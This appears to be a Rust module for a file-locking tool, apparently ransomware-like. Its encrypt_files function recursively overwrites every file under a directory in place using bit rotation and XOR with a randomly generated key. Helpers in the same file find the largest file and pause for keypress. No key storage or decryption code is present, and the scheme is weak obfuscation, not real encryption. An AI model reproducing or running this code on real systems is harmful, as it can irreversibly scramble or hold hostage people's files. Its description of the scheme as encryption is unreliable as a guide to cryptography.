
use rand::Rng;
use std::fs;
use std::io::{self, Write};
use std::path::Path;

pub fn bit_shift(data: &mut [u8]) {
    for byte in data {
        *byte = byte.wrapping_shr(1) | byte.wrapping_shl(7);
    }
}

pub fn xor(data: &mut [u8], key: &[u8]) {
    let key_len = key.len();
    for (i, byte) in data.iter_mut().enumerate() {
        let key_byte = key.get(i % key_len).unwrap_or(&0);
        *byte ^= *key_byte;
    }
}

pub fn generate_key(len: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    (0..len).map(|_| rng.gen()).collect()
}

pub fn get_max_file_size(dir: &Path) -> Option<u64> {
    let mut max_size = None;

    for entry in fs::read_dir(dir).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        let file_type = entry.file_type().unwrap();

        if file_type.is_file() {
            let size = entry.metadata().unwrap().len();

            if max_size.is_none() || size > max_size.unwrap() {
                max_size = Some(size);
            }
        } else if file_type.is_dir() {
            let subdir_max_size = get_max_file_size(&path);

            if subdir_max_size.is_some() {
                let size = subdir_max_size.unwrap();

                if max_size.is_none() || size > max_size.unwrap() {
                    max_size = Some(size);
                }
            }
        }
    }

    max_size
}

pub fn pause() -> io::Result<()> {
    let mut input = String::new();
    print!("Press any key to continue...");
    io::stdout().flush()?;
    io::stdin().read_line(&mut input)?;
    Ok(())
}

pub fn encrypt_files(path: &Path, key: &[u8]) -> io::Result<usize> {
    let mut num_files_encrypted = 0;

    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let file_type = entry.file_type()?;
        let entry_path = entry.path();

        if file_type.is_file() {
            let mut data = fs::read(&entry_path)?;
            bit_shift(&mut data);
            xor(&mut data, &key);
            fs::write(&entry_path, &data)?;
            num_files_encrypted += 1;
        } else if file_type.is_dir() {
            num_files_encrypted += encrypt_files(&entry_path, &key)?;
        }
    }

    Ok(num_files_encrypted)
}
